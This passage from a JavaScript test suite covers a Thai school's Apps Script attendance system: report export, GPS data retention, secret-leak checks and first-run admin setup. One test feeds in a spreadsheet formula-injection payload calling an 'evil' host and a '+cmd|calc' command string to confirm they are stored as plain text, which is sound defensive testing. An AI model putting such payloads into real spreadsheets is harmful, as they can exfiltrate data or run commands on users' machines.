  expectErr(sys.api(sys.admin, 'report.individual', { employeeId: b.id, from: '2026-11-30', to: '2026-11-01' }), 'VALIDATION');
  expectErr(sys.api(sys.admin, 'report.individual', { employeeId: 'nope' }), 'VALIDATION');
});

test('P05', 'ส่งออก Excel/PDF: หัวกระดาษทางการครบ, ไฟล์ชั่วคราวถูกลบ (ถังขยะ), บันทึก Audit', () => {
  const sys = newSystem();
  buildMonthScenario(sys);
  for (const format of ['xlsx', 'pdf']) {
    const x = ok(sys.api(sys.admin, 'report.export', { reportType: 'monthly', params: { year: 2026, month: 11 }, format }));
    const content = Buffer.from(x.base64, 'base64').toString('utf8');
    assert.ok(format === 'pdf' ? content.startsWith('%PDF') : content.startsWith('PK'));
    ['โรงเรียนวัดเสาหิน จังหวัดเชียงใหม่', 'รายงานสรุปการปฏิบัติงานประจำเดือน', 'ช่วงวันที่: เดือนพฤศจิกายน 2569', 'วันที่จัดทำรายงาน', 'สรุปผล', 'ผู้อำนวยการโรงเรียน', 'นางสาวครู ทดสอบที่หนึ่ง']
      .forEach(t => assert.ok(content.includes(t), format + ' missing ' + t));
    assert.ok(x.fileName.endsWith('.' + format));
  }
  const temps = [...sys.env.state.driveFiles.values()].filter(f => f.name.startsWith('TEMP-'));
  assert.strictEqual(temps.length, 2); assert.ok(temps.every(f => f.trashed));
  assert.ok(/format=pdf.*portrait=false.*gridlines=false/.test(sys.env.state.fetchLog[1].url));
  assert.strictEqual(records(sys, 'AuditLogs').filter(l => l.Action === 'REPORT_EXPORT').length, 2);
  for (const type of ['daily', 'yearly']) ok(sys.api(sys.admin, 'report.export', { reportType: type, params: { date: '2026-11-09', year: 2026 }, format: 'xlsx' }));
});

test('P06', 'สร้างตารางสรุปรายวันใหม่ (Rebuild) ได้ผลตรงกับข้อมูลเดิม', () => {
  const sys = newSystem();
  buildMonthScenario(sys);
  const before = ok(sys.api(sys.admin, 'report.monthly', { year: 2026, month: 11 }));
  sheet(sys, 'DailySummary').getRange(2, 1, 1, 18).clearContent(); // ทำข้อมูลสรุปเสียหาย 1 แถว
  ok(sys.api(sys.admin, 'sys.rebuildSummary', { year: 2026, month: 11 }));
  const after = ok(sys.api(sys.admin, 'report.monthly', { year: 2026, month: 11 }));
  assert.deepStrictEqual(after.tables[0].rows, before.tables[0].rows);
  assert.strictEqual(records(sys, 'DailySummary').length, 4);
});

/* ================================================================== MAINTENANCE / PRIVACY */
test('D01', 'ลบพิกัด GPS อัตโนมัติเมื่อเกินระยะเวลาเก็บรักษา (คงระยะทาง/เวลาไว้)', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  sys.at('2026-11-09 07:50:00'); ok(sys.api(t.token, 'att.checkIn', INSIDE));
  sys.at('2027-11-09 02:00:00'); // 365 วัน → ยังไม่ลบ
  sys.env.call('DailyMaintenance');
  assert.strictEqual(typeof records(sys, 'AttendanceLogs')[0].Latitude, 'number');
  sys.env.state.cache.clear();
  sys.at('2027-11-11 02:00:00');
  sys.env.call('DailyMaintenance');
  const log = records(sys, 'AttendanceLogs')[0];
  assert.strictEqual(log.Latitude, ''); assert.strictEqual(log.Longitude, ''); assert.ok(log.DistanceM > 0); assert.strictEqual(log.Time, '07:50:00');
  assert.strictEqual(sys.env.call('DailyMaintenance'), 'เพิ่งรันไปแล้ว'); // จำกัดความถี่
});

/* ================================================================== WEB / SECRETS */
test('W01', 'doGet: แสดงหน้าเว็บ, มี viewport สำหรับมือถือ, ไม่มี Spreadsheet ID/ข้อมูลลับในหน้าเว็บ', () => {
  const sys = newSystem();
  const out = sys.env.context.doGet({ parameter: {} });
  const html = out.getContent();
  assert.ok(/ระบบลงเวลาปฏิบัติงานออนไลน์/.test(out.getTitle()));
  assert.ok(/width=device-width/.test(out.meta.viewport));
  assert.ok(html.includes('id="view-login"') && html.includes('id="view-register"') && html.includes('id="view-app"'));
  assert.ok(!html.includes('<?'), 'unevaluated scriptlet');
  const p = sys.env.state.props;
  [p.SPREADSHEET_ID, p.PASSWORD_PEPPER, p.ATTACHMENT_FOLDER_ID].forEach(sec => assert.ok(!html.includes(sec)));
  assert.ok(!/id="view-admin-content"/.test(html), 'admin UI must not be embedded for everyone');
});

test('W02', 'ไม่มีข้อมูลลับ (PasswordHash/Pepper/Spreadsheet ID) ในผลลัพธ์ API ใด ๆ', () => {
  const sys = newSystem();
  const { a, b } = buildMonthScenario(sys);
  const p = sys.env.state.props;
  const secrets = [p.SPREADSHEET_ID, p.PASSWORD_PEPPER, p.ATTACHMENT_FOLDER_ID, p.EXPORT_FOLDER_ID, 'pbkdf2_sha256', 'PasswordHash'];
  const outputs = [
    sys.env.call('getPublicConfig'),
    sys.api(a.token, 'me.dashboard', {}), sys.api(a.token, 'me.history', {}), sys.api(b.token, 'leave.my', {}),
    sys.api(sys.admin, 'emp.list', {}), sys.api(sys.admin, 'emp.basicList', {}), sys.api(sys.admin, 'settings.get', {}),
    sys.api(sys.admin, 'admin.overview', {}), sys.api(sys.admin, 'audit.list', {}), sys.api(sys.admin, 'report.individual', { employeeId: a.id }),
    sys.api(sys.admin, 'leave.adminList', { status: 'ALL' }), sys.api(sys.admin, 'corr.adminList', { status: 'ALL' })
  ];
  outputs.forEach((o, i) => { assert.ok(o.ok, i); const j = JSON.stringify(o); secrets.forEach(s => assert.ok(!j.includes(s), `output ${i} leaks ${s.slice(0, 12)}`)); });
});

test('W03', 'ข้อความที่ขึ้นต้นด้วย = + - @ ถูกบันทึกเป็นข้อความ (ป้องกัน Formula Injection)', () => {
  const sys = newSystem();
  const t = addTeacher(sys, 1);
  const lv = ok(sys.api(t.token, 'leave.submit', { type: 'OTHER', startDate: '2026-11-10', endDate: '2026-11-10', reason: '=IMPORTXML("http://evil","//a")' })).leave;
  ok(sys.api(sys.admin, 'leave.review', { leaveId: lv.leaveId, decision: 'REJECT', note: '+cmd|calc' }));
  const rec = records(sys, 'LeaveRequests')[0];
  assert.strictEqual(rec.Reason, '=IMPORTXML("http://evil","//a")'); assert.strictEqual(rec.ReviewNote, '+cmd|calc');
});


/* ================================================================== FIRST RUN (ติดตั้งแบบง่าย) */
function freshEnv() {
  // ติดตั้งแบบง่าย: วางโค้ด → Deploy → เปิดเว็บ (ไม่รัน SetupSystem จาก Editor)
  const env = createGasEnv({ printErrors: !!process.env.DEBUG });
  env.state.props.PBKDF2_ITERATIONS = '20000';
  env.clock.setBkk('2026-11-09 07:00:00');
  env.state.activeEmail = ''; // ผู้เยี่ยมชมเว็บแอป
  return env;
}
const ADMIN_FORM = { fullName: 'นายผู้ดูแล คนแรก', staffCode: 'A001', position: 'ครู', username: 'first.admin', password: 'FirstAdm1n2026', confirmPassword: 'FirstAdm1n2026' };

test('F01', 'ติดตั้งอัตโนมัติเมื่อเปิดเว็บครั้งแรก: สร้างฐานข้อมูล/ชีต/กุญแจ และรหัสติดตั้ง (ไม่เปิดเผยรหัสในหน้าเว็บ)', () => {
  const env = freshEnv();
  const cfg = ok(env.call('getPublicConfig'));
  assert.strictEqual(cfg.setupComplete, true); assert.strictEqual(cfg.needsFirstAdmin, true);
  const p = env.state.props;
  assert.ok(p.SPREADSHEET_ID && p.PASSWORD_PEPPER && p.SETUP_CODE);
  assert.ok(!JSON.stringify(cfg).includes(p.SETUP_CODE) && !JSON.stringify(cfg).includes(p.SPREADSHEET_ID));
  const ss = env.SpreadsheetApp.openById(p.SPREADSHEET_ID);
  assert.strictEqual(ss.getName(), 'ฐานข้อมูลระบบลงเวลา โรงเรียนวัดเสาหิน');
  assert.strictEqual(ss.getSheets().length, 10);
  assert.ok(JSON.stringify(ss.getSheetByName('เริ่มต้นใช้งาน').rows).includes(p.SETUP_CODE));
  const html = env.context.doGet({}).getContent();
  assert.ok(!html.includes(p.SETUP_CODE));
  const again = ok(env.call('getPublicConfig'));
  assert.strictEqual(env.state.props.SETUP_CODE, p.SETUP_CODE); assert.strictEqual(again.needsFirstAdmin, true);
});

test('F02', 'รหัสติดตั้งผิด → ปฏิเสธ และจำกัดจำนวนครั้ง (20 ครั้ง/ชม.)', () => {
  const env = freshEnv();
  env.call('getPublicConfig');
  const r = expectErr(env.call('firstRunSetup', Object.assign({ setupCode: 'AAAA-BBBB-CCCC' }, ADMIN_FORM)), 'VALIDATION');
  assert.strictEqual(r.data.field, 'setupCode');
  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: '' }, ADMIN_FORM)), 'VALIDATION');
  for (let i = 0; i < 19; i++) env.call('firstRunSetup', Object.assign({ setupCode: 'WRONG-' + i }, ADMIN_FORM));
  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: env.state.props.SETUP_CODE }, ADMIN_FORM)), 'LOCKED');
  assert.strictEqual(env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('Employees')._records().length, 0);
});

test('F03', 'รหัสถูกต้อง → สร้างผู้ดูแลระบบ + ตั้งพิกัด/เวลา + เข้าสู่ระบบทันที; รหัสถูกลบ; ใช้ซ้ำไม่ได้', () => {
  const env = freshEnv();
  env.call('getPublicConfig');
  const code = env.state.props.SETUP_CODE;
  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code }, ADMIN_FORM, { password: 'short', confirmPassword: 'short' })), 'VALIDATION');
  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code, settings: { WORK_START_TIME: '09:00', LATE_AFTER_TIME: '08:00' } }, ADMIN_FORM)), 'VALIDATION');
  const d = ok(env.call('firstRunSetup', Object.assign({ setupCode: code.toLowerCase().replace(/-/g, ' '), settings: {
    SCHOOL_LAT: '18.7883', SCHOOL_LNG: '98.9853', WORK_START_TIME: '07:30', LATE_AFTER_TIME: '08:00', WORK_END_TIME: '16:30', SETTINGS_CONFIRMED: true } }, ADMIN_FORM)));
  assert.strictEqual(d.user.role, 'ADMIN'); assert.strictEqual(d.mustChangePassword, false);
  const ov = ok(env.call('api', d.token, 'admin.overview', {}));
  assert.deepStrictEqual(ov.warnings, []);
  const st = ok(env.call('api', d.token, 'settings.get', {})).values;
  assert.deepStrictEqual([st.SCHOOL_LAT, st.WORK_START_TIME, st.LATE_AFTER_TIME, st.SETTINGS_CONFIRMED], ['18.7883', '07:30', '08:00', 'TRUE']);
  assert.ok(!('SETUP_CODE' in env.state.props));
  assert.strictEqual(env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('เริ่มต้นใช้งาน'), null);
  assert.strictEqual(ok(env.call('getPublicConfig')).needsFirstAdmin, false);
  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code }, ADMIN_FORM, { username: 'second.admin', staffCode: 'A002' })), 'ALREADY_SETUP');
  ok(env.call('login', 'first.admin', 'FirstAdm1n2026', {}));
  const aud = env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('AuditLogs')._records();
  assert.ok(aud.some(a => a.Action === 'FIRST_RUN_SETUP'));
});

test('F04', 'ระบบที่ติดตั้งแบบเดิม (CreateFirstAdmin) ไม่แสดงหน้าติดตั้ง และเรียก firstRunSetup ไม่ได้', () => {
  const sys = newSystem();
  assert.strictEqual(ok(sys.env.call('getPublicConfig')).needsFirstAdmin, false);
  expectErr(sys.env.call('firstRunSetup', Object.assign({ setupCode: 'ABCD-EFGH-JKLM' }, ADMIN_FORM)), 'ALREADY_SETUP');
});

/* ================================================================== RUN */
(function run() {
  const results = [];
  const t0 = Date.now();
  const only = process.env.ONLY ? process.env.ONLY.split(',') : null;
  for (const t of tests) {
    if (only && !only.includes(t.id)) continue;
    const s = Date.now();
    try { t.fn(); results.push({ id: t.id, name: t.name, ok: true, ms: Date.now() - s }); process.stdout.write(`✔ ${t.id} ${t.name} (${Date.now() - s} ms)\n`); }
    catch (e) { results.push({ id: t.id, name: t.name, ok: false, ms: Date.now() - s, err: e.stack || String(e) }); process.stdout.write(`✘ ${t.id} ${t.name}\n   ${String(e.stack || e).split('\n').slice(0, 6).join('\n   ')}\n`); }
  }
  const passed = results.filter(r => r.ok).length;
  const summary = `\n${passed}/${results.length} passed in ${((Date.now() - t0) / 1000).toFixed(1)} s`;
  console.log(summary);
  const dir = path.join(__dirname, 'results');
  fs.mkdirSync(dir, { recursive: true });
  const md = ['# ผลการทดสอบ Backend (Apps Script simulator)', '', `รันเมื่อ: ${new Date().toISOString()}  `, `Node.js ${process.version}  `, `ผลรวม: **${passed}/${results.length} ผ่าน**`, '',
    '| รหัส | รายการทดสอบ | ผล | เวลา (ms) |', '|---|---|---|---|',
    ...results.map(r => `| ${r.id} | ${r.name} | ${r.ok ? '✅ ผ่าน' : '❌ ไม่ผ่าน'} | ${r.ms} |`), ''];
  const variant = (process.env.GAS_SRC || 'src') === 'dist' ? '-dist' : '';
  if (variant) md[0] += ' — ชุดติดตั้งแบบง่าย (dist/ 3 ไฟล์)';
  fs.writeFileSync(path.join(dir, 'backend-results' + variant + '.md'), md.join('\n'));
  process.exitCode = passed === results.length ? 0 : 1;
})();
